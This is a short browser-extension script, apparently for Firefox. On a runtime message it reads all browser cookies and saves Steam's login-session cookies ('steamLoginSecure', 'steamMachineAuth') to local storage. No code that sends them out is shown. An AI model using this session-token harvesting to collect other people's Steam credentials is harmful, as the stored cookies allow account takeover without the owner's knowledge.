var domains = ["*://steamcommunity.com/*", "*://store.steampowered.com/*", "*://help.steampowered.com/*"]

function onError(error){
    console.log(error)
}

function isCookieInteresting(cookie){
    return cookie.name === "steamLoginSecure" || cookie.name.includes("steamMachineAuth")
}

function rememberCookie(cookie){
    var storingNote = browser.storage.local.set({ [cookie.name] : cookie });
    storingNote.then(() => {}, onError)
}

function saveAllTheInterestingCookies(cookieList){
    console.log("Looking for interesting cookies in '" + cookieList + "'");
    for(let cookie of cookieList){
        console.log("What is this?:'" + cookie + "'");
        console.log("Domain:'" + cookie.domain + "'");
        if(isCookieInteresting(cookie)){
            console.log("Interesting cookie found:'" + cookie.name + "'");
            rememberCookie(cookie)
        } else {
            console.log("Not interesting cookie:'" + cookie.name + "'");
        }
    }
}

function saveCookiesForDomain(domain){
    console.log("For domain:'" + domain + "'");
    var promiseOfCookies = browser.cookies.getAll({});
    promiseOfCookies.then(function(cookieList) {saveAllTheInterestingCookies(cookieList)});
}

function sniffForCookies(){
    console.log("Sniffing");
    for(let domain of domains){
        saveCookiesForDomain(domain)
    }
}


function listener(request, sender){
    sniffForCookies()
}

browser.runtime.onMessage.addListener(listener);